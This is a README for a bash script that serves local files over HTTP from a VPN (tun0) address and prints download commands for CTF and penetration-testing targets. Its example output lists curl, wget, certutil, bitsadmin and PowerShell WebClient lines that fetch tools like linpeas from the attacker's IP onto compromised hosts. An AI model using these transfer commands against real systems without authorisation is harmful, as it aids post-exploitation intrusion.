# HTTP Server and Downloader

A simple bash script to serve files from your current directory over HTTP and generate platform-specific download commands for penetration testing and CTF scenarios.

## Features

- 🚀 **Quick HTTP Server**: Serves files using `goshs` on port 80
- 🔍 **Auto-Detection**: Automatically detects your `tun0` IP address (VPN/HTB)
- 📋 **Download Commands**: Generates ready-to-use download commands for:
  - Linux (curl, wget)
  - Windows CMD (certutil, curl, bitsadmin)
  - Windows PowerShell (Invoke-WebRequest, WebClient)
- 🔒 **URL Encoding**: Properly handles filenames with spaces, `#`, and `%` characters
- 📁 **File Listing**: Lists all files in the current directory with their download commands

## Prerequisites

- **goshs**: A simple HTTP server written in Go
  ```bash
  go install github.com/patrickhener/goshs@latest
  ```
  
- **VPN Connection**: Must be connected to a VPN with a `tun0` interface (e.g., HackTheBox, TryHackMe)

## Installation

1. Clone or download the script:
   ```bash
   git clone <repository-url>
   cd httpserver-and-downloader
   ```

2. Make the script executable:
   ```bash
   chmod +x serve_local.sh
   ```

## Usage

1. Navigate to the directory containing files you want to serve:
   ```bash
   cd /path/to/your/files
   ```

2. Run the script:
   ```bash
   ./serve_local.sh
   ```

3. The script will:
   - Detect your `tun0` IP address
   - List all files in the current directory
   - Print download commands for each file
   - Start the HTTP server on port 80

4. Copy and paste the appropriate download command on the target machine

## Example Output

```
tun0 IP detected: 10.10.14.42

Files in /home/user/tools:
  - linpeas.sh
  - chisel

========== Download commands (per file) ==========

File: linpeas.sh
  Linux:
    curl -fsSL "http://10.10.14.42:80/linpeas.sh" -o "linpeas.sh" && chmod +x "linpeas.sh"
    wget -q --show-progress -O "linpeas.sh" "http://10.10.14.42:80/linpeas.sh" && chmod +x "linpeas.sh"

  Windows (CMD):
    certutil -urlcache -split -f "http://10.10.14.42:80/linpeas.sh" "linpeas.sh"
    curl "http://10.10.14.42:80/linpeas.sh" -o "%CD%\linpeas.sh"
    bitsadmin /transfer dl "http://10.10.14.42:80/linpeas.sh" "%CD%\linpeas.sh"

  Windows (PowerShell):
    PowerShell -Command "Invoke-WebRequest -Uri 'http://10.10.14.42:80/linpeas.sh' -OutFile 'linpeas.sh'"
    PowerShell -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.42:80/linpeas.sh','linpeas.sh')"
    PowerShell -Command "iwr 'http://10.10.14.42:80/linpeas.sh' -OutFile 'linpeas.sh'"

==============================================
Starting goshs server on port 80 (foreground)
Serving directory: /home/user/tools
URL: http://10.10.14.42:80/
(Press Ctrl+C to stop)
==============================================
```

## Use Cases

### Penetration Testing
- Quickly transfer enumeration scripts (linpeas, winpeas, etc.)
- Serve exploit payloads to target machines
- Transfer tools during post-exploitation

### CTF Challenges
- Serve files to compromised machines
- Quick file transfers during competitions
- Easy access to your toolkit

### Red Team Operations
- Serve payloads during engagements
- Transfer tools to compromised hosts
- Quick and reliable file transfer method

## Technical Details

### URL Encoding
The script properly URL-encodes filenames with special characters:
- Spaces → `%20`
- Hash (`#`) → `%23`
- Percent (`%`) → `%25`

The encoding order is critical to prevent double-encoding issues.

### Port Configuration
Default port is **80** (requires root/sudo on Linux). You can modify the `PORT` variable in the script if needed:
```bash
PORT=8080  # Change to your preferred port
```

### Network Interface
The script specifically looks for the `tun0` interface, which is standard for VPN connections. If you need to use a different interface, modify the `get_tun0_ip()` function.

## Troubleshooting

### Error: No IPv4 address found on tun0
- **Cause**: Not connected to VPN or VPN interface is not named `tun0`
- **Solution**: Connect to your VPN (HackTheBox, TryHackMe, etc.)

### Error: 'goshs' not found in PATH
- **Cause**: goshs is not installed or not in PATH
- **Solution**: Install goshs:
  ```bash
  go install github.com/patrickhener/goshs@latest
  ```

### Permission denied on port 80
- **Cause**: Port 80 requires root privileges
- **Solution**: Run with sudo:
  ```bash
  sudo ./serve_local.sh
  ```
  Or change the port to something above 1024 (e.g., 8080)

## Security Considerations

⚠️ **Warning**: This script is designed for penetration testing and CTF environments. Do not use in production or expose to untrusted networks.

- The server serves files without authentication
- All files in the directory are accessible
- Use only in controlled, authorized environments
- Always ensure you have permission to transfer files

## License

This project is provided as-is for educational and authorized penetration testing purposes only.

## Contributing

Feel free to submit issues or pull requests for improvements!

## Changelog

### Version 1.0
- Initial release
- Support for goshs HTTP server
- Auto-detection of tun0 IP
- Multi-platform download commands
- Proper URL encoding for special characters
